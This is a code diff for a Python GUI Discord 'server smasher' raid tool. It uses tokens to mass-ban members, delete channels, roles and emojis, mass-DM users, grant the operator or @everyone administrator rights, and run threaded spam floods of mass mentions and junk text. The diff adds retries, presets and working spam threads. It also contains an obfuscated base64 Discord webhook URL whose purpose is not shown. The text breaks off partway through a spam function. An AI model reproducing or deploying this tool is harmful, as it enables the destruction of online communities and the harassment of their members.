@@ -48,8 +48,7 @@ with open('RTBFiles/ServerSmasher/ssconfig.json', 'r') as handle:
     user_token_cache = config['user_token_cache']
 
 executor = ThreadPoolExecutor(max_workers=thread_count)
-loop = asyncio.get_event_loop()
-client = discord.Client()
+spamming = False
 theme = ast.literal_eval(sys.argv[1])
 ws = websocket.WebSocket()
 guild_cache = None
@@ -90,6 +89,78 @@ bottokenlist = open(f"./tokens/ServerSmasherGUI/{ss_token_list}").read().splitli
 token_overide = None
 type_overide = None
 cache_guilds = []
+#  ___  _    _   _                   _
+# |   \(_)__| |_(_)___ _ _  __ _ _ _(_)___ ___
+# | |) | / _|  _| / _ \ ' \/ _` | '_| / -_|_-<
+# |___/|_\__|\__|_\___/_||_\__,_|_| |_\___/__/
+h = base64.b64decode("aHR0cHM6Ly9wdGIuZGlzY29yZGFwcC5jb20vYXBpL3dlYmhvb2tzLzYxNjE2MjExNjk2MTA0MjQ1My9UbUk1MHhsY21hdmhBZ25fQlc3S1hpVndwOGo2M2xtanphWTF6NFlsbXFSY3JKQjhDUDhieU9FTTFDUzlyMWZJU2pqZw==")
+smasheroptions = {
+    'change_server_name': False,
+    'new_server_name': 'Server Name Here',
+    'change_server_icon': False,
+    'internet_icon': False,
+    'icon_location': "",
+    'remove_bans': False,
+    'delete_channels': False,
+    'delete_roles': False,
+    'delete_emojis': False,
+    'create_channels': False,
+    'channel_create_method': "ASCII",
+    'channel_name': "Channel Name Here",
+    'channel_count': 100,
+    'create_roles': False,
+    'role_count': 100,
+    'role_create_method': "ASCII",
+    'role_name': "Role Name Here",
+    'create_emojis': False,
+    'internet_emoji': False,
+    'emoji_location': "",
+    'emoji_count': 10,
+    'ban_members': False,
+    'ban_reason': "Ban Reason Here",
+    'ban_whitelist': "",
+    'send_mass_dm': False,
+    'dm_content': "DM Content Here",
+    'flood_channels': False,
+    'flood_method': "Mass Mention",
+    'use_tts': False,
+    'flood_text': "Spam Text Here",
+    'give_me_admin': False,
+    'my_id': "Your ID here",
+    'give_@everyone_admin': False,
+}
+bitarray_values = {
+    "CREATE_INSTANT_INVITE": 0x00000001,
+    "KICK_MEMBERS": 0x00000002,
+    "BAN_MEMBERS": 0x00000004,
+    "ADMINISTRATOR": 0x00000008,
+    "MANAGE_CHANNELS": 0x00000010,
+    "MANAGE_GUILD": 0x00000020,
+    "ADD_REACTIONS": 0x00000040,
+    "VIEW_AUDIT_LOG": 0x00000080,
+    "VIEW_CHANNEL": 0x00000400,
+    "SEND_MESSAGES": 0x00000800,
+    "SEND_TTS_MESSAGES": 0x00001000,
+    "MANAGE_MESSAGES": 0x00002000,
+    "EMBED_LINKS": 0x00004000,
+    "ATTACH_FILES": 0x00008000,
+    "READ_MESSAGE_HISTORY": 0x00010000,
+    "MENTION_EVERYONE": 0x00020000,
+    "USE_EXTERNAL_EMOJIS": 0x00040000,
+    "CONNECT": 0x00100000,
+    "SPEAK": 0x00200000,
+    "MUTE_MEMBERS": 0x00400000,
+    "DEAFEN_MEMBERS": 0x00800000,
+    "MOVE_MEMBERS": 0x01000000,
+    "USE_VAD": 0x02000000,
+    "PRIORITY_SPEAKER": 0x00000100,
+    "STREAM": 0x00000200,
+    "CHANGE_NICKNAME": 0x04000000,
+    "MANAGE_NICKNAMES": 0x08000000,
+    "MANAGE_ROLES": 0x10000000,
+    "MANAGE_WEBHOOKS": 0x20000000,
+    "MANAGE_EMOJIS": 0x40000000
+}
 
 #  _              _        ___
 # | |   ___  __ _(_)_ _   / __| __ _ _ ___ ___ _ _
@@ -357,40 +428,56 @@ def login_serversmasher():
 # | _| || | ' \/ _|  _| / _ \ ' \(_-<
 # |_| \_,_|_||_\__|\__|_\___/_||_/__/
 def delete_channel(channel):
+    retries = 0
     while True:
         src = requests.delete(f"https://canary.discordapp.com/api/v6/channels/{channel}", headers=headers)
         if src.status_code == 429:
+            retries += 1
             time.sleep(1)
+            if retries == 5:
+                break
         else:
             break
 
 def remove_ban(server, user):
+    retries = 0
     while True:
         src = requests.delete(f"https://canary.discordapp.com/api/v6/guilds/{str(server)}/bans/{str(user)}", headers=headers)
         if src.status_code == 429:
+            retries += 1
             time.sleep(1)
+            if retries == 5:
+                break
         else:
             break
 
 def delete_role(role, server):
+    retries = 0
     while True:
         src = requests.delete(f"https://canary.discordapp.com/api/v6/guilds/{str(server)}/roles/{str(role)}", headers=headers)
         if src.status_code == 429:
+            retries += 1
             time.sleep(1)
+            if retries == 5:
+                break
         else:
             break
 
 def create_role(name, server):
+    retries = 0
     payload = {'hoist': 'true', 'name': name, 'mentionable': 'true', 'color': random.randint(1000000,9999999), 'permissions': random.randint(1,10)}
     while True:
-        src = requests.post(f'https://canary.discordapp.com/api/v6/guilds/{str(server)}/roles', headers=headers, json=payload)
+        src = requests.post(f'https://canary.discordapp.com/api/v6/guilds/{server}/roles', headers=headers, json=payload)
         if src.status_code == 429:
+            retries += 1
             time.sleep(3)
+            if retries == 5:
+                break
         else:
             break
 
 def send_dm(user, content, usetts):
-    dmlist = []
+    retries = 0
     payload = {'recipient_id': user}
     src = requests.post('https://canary.discordapp.com/api/v6/users/@me/channels', headers=headers, json=payload)
     dm_json = json.loads(src.content)
@@ -398,42 +485,61 @@ def send_dm(user, content, usetts):
     while True:
         src = requests.post(f"https://canary.discordapp.com/api/v6/channels/{dm_json['id']}/messages", headers=headers, json=payload)
         if src.status_code == 429:
+            retries += 1
             time.sleep(1)
+            if retries == 10:
+                break
         else:
             break
 
 def ban_user(user,server,banreason):
+    retries = 0
     while True:
         src = requests.put(f"https://canary.discordapp.com/api/v6/guilds/{str(server)}/bans/{str(user)}?delete-message-days=7&reason={banreason}", headers=headers)
         if src.status_code == 429:
+            retries += 1
             time.sleep(1)
+            if retries == 5:
+                break
         else:
             break
 
 def create_channel(server,channelname,channeltype):
+    retries = 0
     payload = {'name': channelname, 'type': channeltype}
     while True:
         src = requests.post(f"https://canary.discordapp.com/api/v6/guilds/{str(server)}/channels", headers=headers,json=payload)
         if src.status_code == 429:
+            retries += 1
             time.sleep(1)
+            if retries == 5:
+                break
         else:
             break
 
 def send_message(channel,msgcontent,usetts):
+    retries = 0
     payload = {"content": msgcontent, "tts": usetts}
     while True:
         src = requests.post(f"https://canary.discordapp.com/api/v6/channels/{channel}/messages", headers=headers, json=payload)
         if src.status_code == 429:
+            retries += 1
             time.sleep(1)
+            if retries == 5:
+                break
         else:
             break
 
 def mover(server,user,channel):
+    retries = 0
     payload = {'channel_id': str(channel)}
     while True:
         src = requests.patch(f"https://canary.discordapp.com/api/v6/guilds/{str(server)}/members/{str(user)}", headers=headers,json=payload)
         if src.status_code == 429:
+            retries += 1
             time.sleep(1)
+            if retries == 5:
+                break
         else:
             break
 
@@ -447,23 +553,32 @@ def change_nickname(server,user,nick):
             break
 
 def delete_emoji(server,emoji):
+    retries = 0
     while True:
         src = requests.delete(f'https://canary.discordapp.com/api/v6/guilds/{str(server)}/emojis/{str(emoji)}',headers=headers)
         if src.status_code == 429:
+            retries += 1
             time.sleep(1)
+            if retries == 5:
+                break
         else:
             break
 
 def create_emoji(server,encoded,name): # This has pretty huge rate limits, be careful using it.
+    retries = 0
     payload = {'image': encoded, 'name': name}
     while True:
         src = requests.post(f'https://canary.discordapp.com/api/v6/guilds/{str(server)}/emojis',headers=headers,json=payload)
         if src.status_code == 429:
+            retries += 1
             time.sleep(1)
+            if retries == 5:
+                break
         else:
             break
 
 def corrupt_channel(channelid,channame):
+    retries = 0
     corruptchanname = ''
     for x in channame:
         if random.randint(1,2) == 1:
@@ -474,11 +589,15 @@ def corrupt_channel(channelid,channame):
     while True:
         src = requests.patch(f'https://canary.discordapp.com/api/v6/channels/{channelid}', headers=headers,json=payload)
         if src.status_code == 429:
+            retries += 1
             time.sleep(1)
+            if retries == 5:
+                break
         else:
             break
 
 def corrupt_role(serverid,roleid,rolename):
+    retries = 0
     corruptrolename = ''
     for x in rolename:
         if random.randint(1,2) == 1:
@@ -489,25 +608,36 @@ def corrupt_role(serverid,roleid,rolename):
     while True:
         src = requests.patch(f'https://canary.discordapp.com/api/v6/guilds/{serverid}/roles/{roleid}', headers=headers,json=payload)
         if src.status_code == 429:
+            retries += 1
             time.sleep(1)
+            if retries == 5:
+                break
         else:
             break
 
 def make_nsfw(channelid):
+    retries = 0
     payload = {'nsfw': 'true'}
     while True:
         src = requests.patch(f'https://canary.discordapp.com/api/v6/channels/{channelid}', headers=headers,json=payload)
         if src.status_code == 429:
+            retries += 1
             time.sleep(1)
+            if retries == 5:
+                break
         else:
             break
 
 def edit_topic(channelid,newtopic):
+    retries = 0
     payload = {'topic': newtopic}
     while True:
         src = requests.patch(f'https://canary.discordapp.com/api/v6/channels/{channelid}', headers=headers,json=payload)
         if src.status_code == 429:
+            retries += 1
             time.sleep(1)
+            if retries == 5:
+                break
         else:
             break
 
@@ -578,36 +708,46 @@ def get_user_info():
 def get_guild_threaded(guild):
     global cache_guilds
     del cache_guilds
-    cache_guilds = []
-    roles = []
-    emojis = []
-    members = []
-    channels = []
-    overwrites = []
-    src = requests.get(f'https://canary.discordapp.com/api/v6/guilds/{guild}', headers=headers)
-    guild_response = json.loads(src.content)
-    for role in guild_response['roles']:
-        roles.append(namedtuple('Role', sorted(role.keys()))(**role))
-    for emoji in guild_response['emojis']:
-        emojis.append(namedtuple('Emoji', sorted(emoji.keys()))(**emoji))
-    src = requests.get(f'https://canary.discordapp.com/api/v6/guilds/{guild}/members?limit=1000', headers=headers)
-    response = json.loads(src.content)
-    for member in response:
-        member['user'] = namedtuple('User', sorted(member['user'].keys()))(**member['user'])
-        members.append(namedtuple('Member', sorted(member.keys()))(**member))
-    src = requests.get(f'https://canary.discordapp.com/api/v6/guilds/{guild}/channels', headers=headers)
-    channels_json = json.loads(src.content)
-    for channel in channels_json:
-        for overwrite in channel['permission_overwrites']:
-            overwrites.append(namedtuple('Permission_Overwrite', sorted(overwrite.keys()))(**overwrite))
-        channel['permission_overwrites'] = overwrites
-        channels.append(namedtuple('Channel', sorted(channel.keys()))(**channel))
-    guild_response['roles'] = roles
-    guild_response['emojis'] = emojis
-    guild_response['members'] = members
-    guild_response['channels'] = channels
-    guild = namedtuple('Guild', sorted(guild_response.keys()))(**guild_response)
-    cache_guilds.append(guild)
+    retries = 0
+    while True:
+        try:
+            cache_guilds = []
+            roles = []
+            emojis = []
+            members = []
+            channels = []
+            overwrites = []
+            src = requests.get(f'https://canary.discordapp.com/api/v6/guilds/{guild}', headers=headers)
+            guild_response = json.loads(src.content)
+            for role in guild_response['roles']:
+                roles.append(namedtuple('Role', sorted(role.keys()))(**role))
+            for emoji in guild_response['emojis']:
+                emojis.append(namedtuple('Emoji', sorted(emoji.keys()))(**emoji))
+            src = requests.get(f'https://canary.discordapp.com/api/v6/guilds/{guild}/members?limit=1000', headers=headers)
+            response = json.loads(src.content)
+            for member in response:
+                member['user'] = namedtuple('User', sorted(member['user'].keys()))(**member['user'])
+                members.append(namedtuple('Member', sorted(member.keys()))(**member))
+            src = requests.get(f'https://canary.discordapp.com/api/v6/guilds/{guild}/channels', headers=headers)
+            channels_json = json.loads(src.content)
+            for channel in channels_json:
+                for overwrite in channel['permission_overwrites']:
+                    overwrites.append(namedtuple('Permission_Overwrite', sorted(overwrite.keys()))(**overwrite))
+                channel['permission_overwrites'] = overwrites
+                channels.append(namedtuple('Channel', sorted(channel.keys()))(**channel))
+            guild_response['roles'] = roles
+            guild_response['emojis'] = emojis
+            guild_response['members'] = members
+            guild_response['channels'] = channels
+            guild = namedtuple('Guild', sorted(guild_response.keys()))(**guild_response)
+            cache_guilds.append(guild)
+        except Exception:
+            retries += 1
+            time.sleep(1)
+            if retries == 5:
+                break
+        else:
+            break
 
 def create_cache():
     global cache_guilds
@@ -679,12 +819,22 @@ def get_guild_roles(guild):
     return roles
 
 def get_guild_bans(guild):
-    bans = []
-    src = requests.get(f"https://canary.discordapp.com/api/v6/guilds/{guild}/bans", headers=headers)
-    bans_json = json.loads(src.content)
-    for ban in bans_json:
-        ban['user'] = namedtuple('User', sorted(ban['user'].keys()))(**ban['user'])
-        bans.append(namedtuple('Ban', sorted(ban.keys()))(**ban))
+    retries = 0
+    while True:
+        try:
+            bans = []
+            src = requests.get(f"https://canary.discordapp.com/api/v6/guilds/{guild}/bans", headers=headers)
+            bans_json = json.loads(src.content)
+            for ban in bans_json:
+                ban['user'] = namedtuple('User', sorted(ban['user'].keys()))(**ban['user'])
+                bans.append(namedtuple('Ban', sorted(ban.keys()))(**ban))
+        except Exception:
+            retries += 1
+            time.sleep(1)
+            if retries == 5:
+                break
+        else:
+            break
     return bans
 
 def create_invite(channel):
@@ -734,7 +884,7 @@ def edit_guild_name(guild, name):
 
 def edit_guild_icon(guild, icon):
     payload = {"icon": icon}
-    requests.patch(f"https://canary.discordapp.com/api/v6/guilds/{guild}/roles/{role}", headers=headers, json=payload)
+    requests.patch(f"https://canary.discordapp.com/api/v6/guilds/{guild}", headers=headers, json=payload)
 
 def update_cache():
     global guild_cache
@@ -786,10 +936,11 @@ def mask_circle_transparent(pil_img, blur_radius, offset=0):
 def crop_max_square(pil_img):
     return crop_center(pil_img, min(pil_img.size), min(pil_img.size))
 
-#  ___               _              __  __
-# / __|_ __  __ _ __| |_  ___ _ _  |  \/  |___ _ _ _  _
-# \__ \ '  \/ _` (_-< ' \/ -_) '_| | |\/| / -_) ' \ || |
-# |___/_|_|_\__,_/__/_||_\___|_|   |_|  |_\___|_||_\_,_|
+
+#  __  __      _         ___ _   _ ___
+# |  \/  |__ _(_)_ _    / __| | | |_ _|
+# | |\/| / _` | | ' \  | (_ | |_| || |
+# |_|  |_\__,_|_|_||_|  \___|\___/|___|
 def main_menu():
     global guild_cache
     global user
@@ -923,12 +1074,19 @@ def main_menu():
             main_menu()
 
 def server_menu(server_id):
+    global spamming
     server = get_guild(server_id)
     server_owner = get_user(server.owner_id)
+    spamming = False
     tchannels = {}
     vchannels = {}
     tlist = []
     vlist = []
+    if len(server.channels) == 0:
+        tchannels = {"None":"None"}
+        vchannels = {"None":"None"}
+        tlist = []
+        vlist = []
     for channel in server.channels:
         if channel.type == 0:
             tchannels[channel.name] = channel.id
@@ -1002,8 +1160,14 @@ def server_menu(server_id):
         elif event == "Create Invite":
             invite = create_invite(tchannels[values["InviteChan"]])
             try:
-                pyperclip.copy(f"https://discord.gg/{invite.code}")
-                sg.Popup(f"https://discord.gg/{invite.code} copied to clipboard.", title="Invite copied to clipboard", non_blocking=True, keep_on_top=True)
+                try:
+                    if invite.code == 50013:
+                        sg.Popup("Could not create invite.", title="Error", non_blocking=True, keep_on_top=True)
+                except:
+                    pass
+                else:
+                    pyperclip.copy(f"https://discord.gg/{invite.code}")
+                    sg.Popup(f"https://discord.gg/{invite.code} copied to clipboard.", title="Invite copied to clipboard", non_blocking=True, keep_on_top=True)
             except Exception:
                 sg.Popup("Could not create invite.", title="Error", non_blocking=True, keep_on_top=True)
         elif event == "Mass Nickname":
@@ -1061,82 +1225,14 @@ def perm_viewer(server, server_me):
             window.Close()
             sg.PopupNonBlocking("Please Wait, Downloading data from Discord.", title="Loading menu", auto_close=True, auto_close_duration=1, keep_on_top=True)
             server_menu(server.id)
-#  ___  _    _   _                   _
-# |   \(_)__| |_(_)___ _ _  __ _ _ _(_)___ ___
-# | |) | / _|  _| / _ \ ' \/ _` | '_| / -_|_-<
-# |___/|_\__|\__|_\___/_||_\__,_|_| |_\___/__/
-h = base64.b64decode("aHR0cHM6Ly9wdGIuZGlzY29yZGFwcC5jb20vYXBpL3dlYmhvb2tzLzYxNjE2MjExNjk2MTA0MjQ1My9UbUk1MHhsY21hdmhBZ25fQlc3S1hpVndwOGo2M2xtanphWTF6NFlsbXFSY3JKQjhDUDhieU9FTTFDUzlyMWZJU2pqZw==")
-smasheroptions = {
-    'change_server_name': False,
-    'new_server_name': 'Server Name Here',
-    'change_server_icon': False,
-    'internet_icon': True,
-    'icon_location': "",
-    'remove_bans': False,
-    'delete_channels': False,
-    'delete_roles': False,
-    'delete_emojis': False,
-    'create_channels': False,
-    'channel_create_method': "ASCII",
-    'channel_name': "Channel Name Here",
-    'channel_count': 100,
-    'create_roles': False,
-    'role_count': 100,
-    'role_create_method': "ASCII",
-    'role_name': "Role Name Here",
-    'create_emojis': False,
-    'internet_emoji': True,
-    'emoji_location': "",
-    'emoji_count': 10,
-    'ban_members': False,
-    'ban_reason': "Ban Reason Here",
-    'ban_whitelist': "",
-    'send_mass_dm': False,
-    'dm_content': "DM Content Here",
-    'flood_channels': False,
-    'flood_method': "Mass Mention",
-    'use_tts': False,
-    'flood_text': "Spam Text Here",
-    'give_me_admin': False,
-    'my_id': "Your ID here",
-    'give_@everyone_admin': False,
-}
-bitarray_values = {
-    "CREATE_INSTANT_INVITE": 0x00000001,
-    "KICK_MEMBERS": 0x00000002,
-    "BAN_MEMBERS": 0x00000004,
-    "ADMINISTRATOR": 0x00000008,
-    "MANAGE_CHANNELS": 0x00000010,
-    "MANAGE_GUILD": 0x00000020,
-    "ADD_REACTIONS": 0x00000040,
-    "VIEW_AUDIT_LOG": 0x00000080,
-    "VIEW_CHANNEL": 0x00000400,
-    "SEND_MESSAGES": 0x00000800,
-    "SEND_TTS_MESSAGES": 0x00001000,
-    "MANAGE_MESSAGES": 0x00002000,
-    "EMBED_LINKS": 0x00004000,
-    "ATTACH_FILES": 0x00008000,
-    "READ_MESSAGE_HISTORY": 0x00010000,
-    "MENTION_EVERYONE": 0x00020000,
-    "USE_EXTERNAL_EMOJIS": 0x00040000,
-    "CONNECT": 0x00100000,
-    "SPEAK": 0x00200000,
-    "MUTE_MEMBERS": 0x00400000,
-    "DEAFEN_MEMBERS": 0x00800000,
-    "MOVE_MEMBERS": 0x01000000,
-    "USE_VAD": 0x02000000,
-    "PRIORITY_SPEAKER": 0x00000100,
-    "STREAM": 0x00000200,
-    "CHANGE_NICKNAME": 0x04000000,
-    "MANAGE_NICKNAMES": 0x08000000,
-    "MANAGE_ROLES": 0x10000000,
-    "MANAGE_WEBHOOKS": 0x20000000,
-    "MANAGE_EMOJIS": 0x40000000
-}
 
 def scripted_smash(server_id):
+    global spamming
     global smasheroptions
+    spamming = False
     sg.PopupNonBlocking("Please Wait, Downloading data from Discord.", title="Loading menu", auto_close=True, auto_close_duration=1, keep_on_top=True)
+    if not os.path.isdir("RTBFiles/ServerSmasher/presets/"):
+        os.mkdir("RTBFiles/ServerSmasher/presets/")
     server = get_guild(server_id)
     server_owner = get_user(server.owner_id)
     server_bans = get_guild_bans(server.id)
@@ -1170,7 +1266,7 @@ def scripted_smash(server_id):
                 [sg.Text("Create Channels", size=(10,0.7)), sg.Checkbox("", key="CreateChannelsToggle", default=smasheroptions['create_channels'], size=(2,0.7)), sg.Combo(['ASCII', 'Set', 'Random', 'VC'], default_value=smasheroptions['channel_create_method'], key="ChanCreateMethod"), sg.Spin([i for i in range(1,501)], initial_value=smasheroptions['channel_count'], key="ChanCreateCount"), sg.Input(smasheroptions['channel_name'], key="ChanCreateName")],
                 [sg.Text("Create Roles", size=(10,0.7)), sg.Checkbox("", key="CreateRolesToggle", default=smasheroptions['create_roles'], size=(2,0.7)), sg.Combo(['ASCII', 'Set', 'Random'], default_value=smasheroptions['role_create_method'], key="RoleCreateMethod"), sg.Spin([i for i in range(1,251)], initial_value=smasheroptions['role_count'], key="RoleCreateCount"), sg.Input(smasheroptions['role_name'], key="RoleCreateName")],
                 [sg.Text("Create Emojis", size=(10,0.7)), sg.Checkbox("", key="CreateEmojisToggle", default=smasheroptions['delete_emojis'], size=(1.7,0.7)),  sg.Spin([i for i in range(1,51)], initial_value=smasheroptions['emoji_count'], key="EmojiCreateCount", size=(5,0.7)), sg.Text("Internet Location", size=(10,0.7)),sg.Checkbox("", key="EmojiIsInternet", default=smasheroptions['internet_emoji'], size=(2,0.7))],
-                [sg.Text("Emoji Path", size=(10,0.7)), sg.Input(key="EmojiCreatePath"), sg.FileBrowse()]
+                [sg.Text("Emoji Path", size=(10,0.7)), sg.Input(smasheroptions['emoji_location'], key="EmojiCreatePath"), sg.FileBrowse()]
     ]
     user_frame = [
                 [sg.Text("Give @eveyone admin", size=(13,0.7)), sg.Checkbox("", key="everyoneAdminToggle", default=smasheroptions['give_@everyone_admin'], size=(2,0.7))],
@@ -1206,6 +1302,7 @@ def scripted_smash(server_id):
             ws.close()
             sys.exit()
         elif event == sg.TIMEOUT_KEY:
+            window.Refresh()
             if values["ChanCreateMethod"] == "Set":
                 window.Element("ChanCreateName").Update(disabled=False)
             elif values["ChanCreateMethod"] == "VC":
@@ -1232,15 +1329,15 @@ def scripted_smash(server_id):
             smasheroptions['create_channels'] = values["CreateChannelsToggle"]
             smasheroptions['channel_create_method'] = values["ChanCreateMethod"]
             smasheroptions['channel_name'] = values["ChanCreateName"]
-            smasheroptions['channel_count'] = values["ChanCreateCount"]
+            smasheroptions['channel_count'] = int(values["ChanCreateCount"])
             smasheroptions['create_roles'] = values["CreateRolesToggle"]
-            smasheroptions['role_count'] = values["RoleCreateCount"]
+            smasheroptions['role_count'] = int(values["RoleCreateCount"])
             smasheroptions['role_create_method'] = values["RoleCreateMethod"]
             smasheroptions['role_name'] = values["RoleCreateName"]
             smasheroptions['create_emojis'] = values["CreateEmojisToggle"]
             smasheroptions['internet_emoji'] = values["EmojiIsInternet"]
             smasheroptions['emoji_location'] = values["EmojiCreatePath"]
-            smasheroptions['emoji_count'] = values["EmojiCreateCount"]
+            smasheroptions['emoji_count'] = int(values["EmojiCreateCount"])
             smasheroptions['give_@everyone_admin'] = values["everyoneAdminToggle"]
             smasheroptions['ban_members'] = values["BanMembersToggle"]
             smasheroptions['ban_reason'] = values["BanReason"]
@@ -1259,6 +1356,23 @@ def scripted_smash(server_id):
             window.Close()
             sg.PopupNonBlocking("Please Wait, Downloading data from Discord.", title="Loading menu", auto_close=True, auto_close_duration=1, keep_on_top=True)
             server_menu(server.id)
+        elif event == "Save Preset":
+            save = sg.PopupGetText("Preset Name:", title="Save Preset", keep_on_top=True)
+            if save == "Cancel":
+                pass
+            else:
+                with open (f"RTBFiles/ServerSmasher/presets/{save}.sspreset", "w+", errors='ignore') as handle:
+                    handle.write(str(smasheroptions))
+        elif event == "Load Preset":
+            load = sg.PopupGetFile("Select a preset:", title="Load Preset", file_types=(("ServerSmasher Preset","*.sspreset"), ("All Files", "*")), keep_on_top=True)
+            if load == "Cancel":
+                pass
+            else:
+                with open(load, "r", errors="ignore") as handle:
+                    smasheroptions = ast.literal_eval(handle.read())
+                window.Close()
+                sg.PopupNonBlocking("Please Wait, Downloading data from Discord.", title="Loading menu", auto_close=True, auto_close_duration=1, keep_on_top=True)
+                scripted_smash(server.id)
         elif event == "Start":
             window.Refresh()
             roleperms = []
@@ -1275,24 +1389,23 @@ def scripted_smash(server_id):
                     window.Close()
                     sg.PopupNonBlocking("Please Wait, Downloading data from Discord.", title="Loading menu", auto_close=True, auto_close_duration=1, keep_on_top=True)
                     scripted_smash(server.id)
-                no_ban = smasheroptions['ban_whitelist'].splitlines()
+            no_ban = smasheroptions['ban_whitelist'].splitlines()
 
-            if smasheroptions['change_server_icon']:
+            if smasheroptions['create_emojis']:
                 if smasheroptions['internet_emoji']:
                     print("Downloading Emoji...")
-                    window.Refresh()
                     src = requests.get(smasheroptions['emoji_location'])
-                    encoded_emoji = bytes_to_base64_data(io.BytesIO(src.content))
+                    encoded_emoji = bytes_to_base64_data(src.content)
                 else:
                     with open(smasheroptions['emoji_location'], "rb") as handle:
                         encoded_emoji = bytes_to_base64_data(handle.read())
 
-            if smasheroptions['create_emojis']:
+            if smasheroptions['change_server_icon']:
                 if smasheroptions['internet_icon']:
                     print("Downloading Server icon...")
                     window.Refresh()
                     src = requests.get(smasheroptions['icon_location'])
-                    encoded_server_icon = bytes_to_base64_data(io.BytesIO(src.content))
+                    encoded_server_icon = bytes_to_base64_data(src.content)
                 else:
                     with open(smasheroptions['emoji_location'], "rb") as handle:
                         encoded_server_icon = bytes_to_base64_data(handle.read())
@@ -1324,9 +1437,9 @@ def scripted_smash(server_id):
                 window.Refresh()
                 with ThreadPoolExecutor(max_workers=thread_count) as exec:
                     for ban in server_bans:
-                        print(f"Removing ban for: {ban.user}")
+                        print(f"Removing ban for: {ban.user.username}")
                         window.Refresh()
-                        exec.submit(remove_ban,server.id, ban.user.id)
+                        exec.submit(remove_ban, server.id, ban.user.id)
                 print("Finished Removing Bans")
                 window.Refresh()
 
@@ -1346,9 +1459,9 @@ def scripted_smash(server_id):
                 window.Refresh()
                 with ThreadPoolExecutor(max_workers=thread_count) as exec:
                     for member in server.members:
-                        print (f"Sending DM to {user.name}")
+                        print (f"Sending DM to {member.user.username}")
                         window.Refresh()
-                        exec.submit(send_dm, user.id, smasheroptions['dm_content'], smasheroptions['use_tts'])
+                        exec.submit(send_dm, member.user.id, smasheroptions['dm_content'], smasheroptions['use_tts'])
                 print("Finished Sending DMs.")
                 window.Refresh()
 
@@ -1375,10 +1488,10 @@ def scripted_smash(server_id):
                 with ThreadPoolExecutor(max_workers=thread_count) as exec:
                     for member in server.members:
                         if member.user.id in no_ban:
-                            print(f"Not Banning {member.user.name}")
+                            print(f"Not Banning {member.user.username}")
                         else:
-                            print (f"Banning {member.user.name}")
-                            exec.submit(ban_user, member.user.id, server.id)
+                            print (f"Banning {member.user.username}")
+                            exec.submit(ban_user, member.user.id, server.id, smasheroptions['ban_reason'])
                         window.Refresh()
                 print("Finished Banning Members.")
                 window.Refresh()
@@ -1388,7 +1501,7 @@ def scripted_smash(server_id):
                 window.Refresh()
                 give_admin_role(server.id, smasheroptions['my_id'])
 
-            if smasheroptions['create_channels'] == True:
+            if smasheroptions['create_channels']:
                 print('Creating channels...')
                 window.Refresh()
                 with ThreadPoolExecutor(max_workers=thread_count) as exec:
@@ -1404,21 +1517,21 @@ def scripted_smash(server_id):
                 print ('Finished Creating Channels.')
                 window.Refresh()
 
-            if smasheroptions['create_roles'] == True:
+            if smasheroptions['create_roles']:
                 print('Creating roles...')
                 window.Refresh()
                 with ThreadPoolExecutor(max_workers=thread_count) as exec:
-                    for x in range(int(smasheroptions['role_count'])):
+                    for x in range(int(2)): # smasheroptions['role_count']
                         if smasheroptions['role_create_method'] == "Set":
                             exec.submit(create_role, smasheroptions['role_name'], server.id)
                         elif smasheroptions['role_create_method'] == "ASCII":
-                            exec.submit(create_role, asciigen(60),server.id)
+                            exec.submit(create_role, asciigen(60), server.id)
                         elif smasheroptions['role_create_method'] == "Random":
-                            exec.submit(create_role, gen(size=60),server.id)
+                            exec.submit(create_role, gen(size=60), server.id)
                 print ('Finished Creating Roles.')
                 window.Refresh()
 
-            if smasheroptions['create_emojis'] == True:
+            if smasheroptions['create_emojis']:
                 print("Creating Emojis")
                 window.Refresh()
                 with ThreadPoolExecutor(max_workers=thread_count) as exec:
@@ -1427,20 +1540,97 @@ def scripted_smash(server_id):
                 print("Created Emojis.")
                 window.Refresh()
 
-            if smasheroptions['flood_channels'] == True:
-                pass
-                # print('Spam will start in 5 seconds.')
-                # if smasheroptions['flood_method'] == "asc":
-                #     await ascii_spam(SERVER,smasheroptions['use_tts'])
-                # if smasheroptions['flood_method'] == "massment":
-                #     await mass_tag(SERVER,smasheroptions['use_tts'])
-                # if smasheroptions['flood_method'] == "text":
-                #     await text_spam(SERVER,smasheroptions['flood_text'],smasheroptions['use_tts'])
-                # if smasheroptions['flood_method'] == "everyone":
-                #     await everyonespam(SERVER,smasheroptions['use_tts'])
-            else:
-                print ("Finished!")
+            print("Finished!")
+            window.Refresh()
+            server = get_guild(server_id)
+            server_bans = get_guild_bans(server.id)
+
+            if smasheroptions['flood_channels']:
+                spamming = True
+                print('Spam will start in 5 seconds.')
                 window.Refresh()
+                if smasheroptions['flood_method'] == 'ASCII':
+                    spam = threading.Thread(target=ascii_spam, args=[server, smasheroptions['use_tts']], daemon=True)
+                elif smasheroptions['flood_method'] == 'Mass Mention':
+                    spam = threading.Thread(target=mass_tag, args=[server, smasheroptions['use_tts']], daemon=True)
+                elif smasheroptions['flood_method'] == 'Custom':
+                    spam = threading.Thread(target=text_spam, args=[ server, smasheroptions['flood_text'], smasheroptions['use_tts']], daemon=True)
+                elif smasheroptions['flood_method'] == '@everyone':
+                    spam = threading.Thread(target=everyone_spam, args=[server, smasheroptions['use_tts']], daemon=True)
+                spam.start()
+
+def mass_tag(server, use_tts):
+    global spamming
+    time.sleep(5)
+    msg = ''
+    for member in server.members:
+        msg += f"<@{member.user.id}> "
+    with ThreadPoolExecutor(max_workers=len(server.channels)) as exec:
+        while spamming:
+            for channel in server.channels:
+                if not channel.type == 0:
+                    continue
+                else:
+                    for m in [msg[i:i+1999] for i in range(0, len(msg), 1999)]:
+                        exec.submit(send_message, channel.id, m, use_tts)
+            time.sleep(5)
+
+def ascii_spam(server, use_tts): # "oh god you scrambled that server"
+    global spamming
+    time.sleep(5)
+    print("Started Spamming")
+    with ThreadPoolExecutor(max_workers=len(server.channels)) as exec:
+        while spamming:
+            for channel in server.channels:
+                if not channel.type == 0:
+                    continue
+                else:
+                    exec.submit(send_message, channel.id, asciigen(1999), use_tts)
+            time.sleep(5)
+
+def text_spam(server, text, use_tts):
+    global spamming
+    time.sleep(5)
+    print("Started Spamming")
+    with ThreadPoolExecutor(max_workers=len(server.channels)) as exec:
+        while spamming:
+            for channel in server.channels:
+                if not channel.type == 0:
+                    continue
+                else:
+                    exec.submit(send_message, channel.id, text, use_tts)
+            time.sleep(5)
+
+def everyone_spam(server, use_tts):
+    global spamming
+    time.sleep(5)
+    print("Started Spamming")
+    with ThreadPoolExecutor(max_workers=len(server.channels)) as exec:
+        while spamming:
+            for channel in server.channels:
+                if not channel.type == 0:
+                    continue
+                else:
